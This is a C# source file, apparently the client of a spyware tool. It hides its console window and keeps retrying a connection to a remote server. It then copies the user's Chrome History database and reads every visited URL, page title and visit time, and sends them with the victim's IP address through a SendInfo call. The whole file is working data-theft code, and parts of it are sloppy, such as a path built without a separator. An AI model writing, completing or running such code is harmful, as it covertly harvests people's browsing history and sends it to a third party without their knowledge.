using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Client_
{
   
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            Client client = new Client();
            do
            {
                try
                {
                    client.Connect();
                    client.isConnect = true;
                }
                catch (Exception)
                {
                    client.isConnect = false;
                    Console.WriteLine("try to connect");
                    Thread.Sleep(2000);

                }
            } while (!client.isConnect);
           
            string chromeHistoryFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Profile 224\History";
            if(!File.Exists(Environment.CurrentDirectory + "ChromeHistory"))
            {

            File.Copy(chromeHistoryFile, Environment.CurrentDirectory + "ChromeHistory");
            }

            chromeHistoryFile = Environment.CurrentDirectory + "ChromeHistory";

            if (File.Exists(chromeHistoryFile))
            {
                SQLiteConnection connection = new SQLiteConnection
                ("Data Source=" + chromeHistoryFile + ";Version=3;New=False;Compress=True;");

                connection.Open();

                DataSet dataset = new DataSet();
                SQLiteDataAdapter adapter = new SQLiteDataAdapter
                    ("select * from urls order by last_visit_time desc", connection);
                adapter.Fill(dataset);
                if (dataset != null && dataset.Tables.Count > 0 & dataset.Tables[0] != null)
                {
                    DataTable dt = dataset.Tables[0];
                    HistoryItem historyItem = new HistoryItem();
                    foreach (DataRow historyRow in dt.Rows)
                    {
                        historyItem.URL.Add(historyRow["url"].ToString());
                        historyItem.Title.Add(historyRow["title"].ToString());


                        // Chrome stores time elapsed since Jan 1, 1601 (UTC format) in microseconds
                        long utcMicroSeconds = Convert.ToInt64(historyRow["last_visit_time"]);

                        // Windows file time UTC is in nanoseconds, so multiplying by 10
                        DateTime gmtTime = DateTime.FromFileTimeUtc(10 * utcMicroSeconds);

                        // Converting to local time
                        DateTime localTime = TimeZoneInfo.ConvertTimeFromUtc(gmtTime, TimeZoneInfo.Local);
                        historyItem.VisitedTime = localTime;
                        historyItem.UserIP = client.ipAddr;


                    }
                    client.SendInfo(historyItem);
                }

            }
        }
    }
}
